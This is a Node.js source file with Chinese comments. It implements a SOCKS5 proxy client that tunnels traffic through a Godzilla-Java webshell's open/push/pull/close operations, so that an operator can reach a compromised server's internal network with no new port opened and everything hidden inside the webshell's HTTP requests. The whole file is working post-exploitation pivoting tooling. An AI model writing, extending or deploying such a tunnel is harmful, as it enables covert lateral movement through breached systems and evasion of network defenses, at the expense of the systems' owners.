// HTTP 隧道客户端：本地 SOCKS5 监听 ↔ godzilla-java WsmG 隧道 ops（t.open/push/pull/close）。
// 目标侧不开新端口——全部流量封装在 webshell 的 HTTP 请求里（t.pull 轮询取回数据）。
// 仅支持 godzilla-java 通道（会话态 dispatcher——隧道状态存于其静态字段）。

import { createServer } from "node:net";
import { call as gjCall } from "./godzilla-java.js";

const active = new Map(); // localPort → { server, conns: Map<socket, {cid, closed}>, conn, timer }

/** 起本地 SOCKS5 隧道监听（no-auth CONNECT）。 */
export function startTunnel(conn, localPort, host = "127.0.0.1") {
	const key = Number(localPort);
	if (active.has(key)) throw new Error(`本地端口 ${localPort} 已被隧道占用`);
	const sessions = new Map(); // socket → { cid, buf }
	const server = createServer((sock) => {
		let phase = "greet";
		let head = Buffer.alloc(0);
		sock.on("data", (d) => {
			head = Buffer.concat([head, d]);
			if (phase === "greet") {
				if (head.length < 2) return;
				const n = head[1];
				if (head.length < 2 + n) return;
				sock.write(Buffer.from([5, 0]));
				phase = "request";
				head = head.subarray(2 + n);
				if (head.length) handleRequest();
			} else if (phase === "request") handleRequest();

			async function handleRequest() {
				if (head.length < 7) return;
				if (head[1] !== 1) { sock.destroy(); return; } // 仅 CONNECT
				const atyp = head[3];
				let host2, o;
				if (atyp === 1) { host2 = `${head[4]}.${head[5]}.${head[6]}.${head[7]}`; o = 8; }
				else if (atyp === 3) { const l = head[4]; host2 = head.subarray(5, 5 + l).toString("utf8"); o = 5 + l; }
				else { sock.destroy(); return; }
				const port = (head[o] << 8) | head[o + 1];
				phase = "relay";
				head = head.subarray(o + 2);
				try {
					const cid = (await gjCall(conn, "t.open", { h: host2, pt: String(port) })).toString("utf8");
					sessions.set(sock, { cid, pending: head });
					sock.write(Buffer.from([5, 0, 0, 1, 0, 0, 0, 0, 0, 0])); // 成功应答
					if (head.length) { await gjCall(conn, "t.push", { c: cid, b: head }); head = Buffer.alloc(0); }
				} catch (e) {
					sock.write(Buffer.from([5, 3, 0, 1, 0, 0, 0, 0, 0, 0]));
					sock.destroy();
				}
			}
		});
		sock.on("data", async (d) => {
			const s = sessions.get(sock);
			if (!s || phase !== "relay") return;
			try { await gjCall(conn, "t.push", { c: s.cid, b: d }); } catch { sock.destroy(); }
		});
		// 注意：上面第二个 data 监听与第一个并存——第一个做握手解析，第二个做隧道转发
		sock.on("close", async () => {
			const s = sessions.get(sock);
			sessions.delete(sock);
			if (s) { try { await gjCall(conn, "t.close", { c: s.cid }); } catch { } }
		});
		sock.on("error", () => {});
	});
	// 轮询：拉取所有活跃隧道的数据
	const timer = setInterval(async () => {
		for (const [sock, s] of sessions) {
			try {
				const r = await gjCall(conn, "t.pull", { c: s.cid });
				if (r.length > 0) {
					if (r[0] === 1) { sock.end(); sessions.delete(sock); try { await gjCall(conn, "t.close", { c: s.cid }); } catch { } }
					else if (r.length > 1) sock.write(r.subarray(1));
				}
			} catch { sock.destroy(); sessions.delete(sock); }
		}
	}, 200);
	return new Promise((resolve, reject) => {
		server.once("error", reject);
		server.listen(key, host, () => {
			active.set(key, { server, sessions, conn, timer });
			resolve({ ok: true, port: key, host });
		});
	});
}

/** 停隧道。 */
export function stopTunnel(localPort) {
	const key = Number(localPort);
	const t = active.get(key);
	if (!t) return { ok: false, error: "隧道不存在" };
	clearInterval(t.timer);
	for (const [sock, s] of t.sessions) { try { gjCall(t.conn, "t.close", { c: s.cid }).catch(() => {}); } catch { } sock.destroy(); }
	t.server.close();
	active.delete(key);
	return { ok: true };
}

export function tunnelStatus() {
	return [...active.keys()].map((p) => ({ port: p, sessions: active.get(p).sessions.size }));
}
